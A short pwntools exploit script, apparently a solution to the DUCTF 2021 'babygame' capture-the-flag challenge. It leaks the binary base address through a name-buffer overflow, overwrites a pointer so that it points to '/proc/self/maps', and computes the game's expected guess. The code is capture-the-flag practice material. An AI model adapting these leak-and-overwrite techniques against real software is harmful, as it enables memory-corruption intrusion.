from pwn import *

# r = remote('pwn-2021.duc.tf', 31907)
r = process('./babygame')
context.log_level = 'debug'
context.arch = 'x86_64'
bin = ELF('./babygame')

def set_username(name):
    r.sendlineafter(b'> ', b'1')
    r.sendafter(b'your username to?\n', name)

def print_username():
    r.sendlineafter(b'> ', b'2')
    
r.sendafter(b'what is your name?', b'a'*0x1f + b'\n')
print_username()
r.recvuntil(b'aaaaaa\n')

bin.address = u64(r.recv(6).ljust(8, b'\x00')) - 0x2024
log.success('Base: %#x' % bin.address)

payload = b'/proc/self/maps\x00'.ljust(0x20, b'a') + p64(bin.address + 0x40a0)
set_username(payload)

guess = hex(bin.address)[2:6].encode()
# print(guess.encode())

# gdb.attach(r, '''
#     b*main+87
# ''')
r.sendlineafter(b'> ', b'1337')
print(guess)
r.sendlineafter(b'guess: ', str(int.from_bytes(guess, 'little', signed=False)).encode())
r.interactive()
